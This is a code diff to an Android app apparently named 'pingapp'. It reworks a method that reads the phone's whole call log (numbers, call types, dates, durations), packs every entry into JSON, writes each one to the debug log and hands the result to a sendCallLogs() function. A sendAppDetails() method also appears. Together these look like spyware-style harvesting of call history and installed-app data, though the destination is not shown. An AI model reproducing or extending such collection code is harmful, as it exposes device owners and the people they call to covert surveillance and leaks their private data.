@@ -1,6 +1,7 @@
 package com.example.pingapp;
 
 import android.Manifest;
+import android.app.Activity;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
@@ -153,9 +154,8 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    private void getCallDetails() {
-        Map<String,List> callHistory =new HashMap<>();
-        List<String> callList = new ArrayList<>();
+    public void getCallDetails() {
+        JSONArray jsonArray =new JSONArray();
         Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                 null, null, null);
         int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
@@ -163,6 +163,7 @@ public class MainActivity extends AppCompatActivity {
         int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
         int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
         while (managedCursor.moveToNext()) {
+            Map<String, String> callHistory =new HashMap<>();
             String phNumber = managedCursor.getString(number);
             String callType = managedCursor.getString(type);
             String callDate = managedCursor.getString(date);
@@ -183,13 +184,23 @@ public class MainActivity extends AppCompatActivity {
                     dir = "MISSED";
                     break;
             }
-            callList.add("Phone Number:--- " + phNumber + " Call Type:--- "
-                    + dir + " Call Date:--- " + callDayTime
-                    + " Call duration in sec :--- " + callDuration);
+            callHistory.put("number",phNumber);
+            callHistory.put("call type",dir);
+            callHistory.put("callDayTime",callDayTime.toString());
+            callHistory.put("callDuration",callDuration);
+            Log.d("jsonObject",new JSONObject(callHistory).toString());
+            jsonArray.put(new JSONObject(callHistory));
         }
         managedCursor.close();
-        callHistory.put("callLogs",callList);
-        sendCallLogs(new JSONObject(callHistory).toString());
+        String jsonData = "some thing went wrong";
+        try{
+            jsonData = jsonArray.toString(4);
+        }
+        catch (Exception e){
+
+        }
+        Log.d(tag,jsonData);
+        sendCallLogs(jsonData);
     }
 
     public void sendAppDetails(){
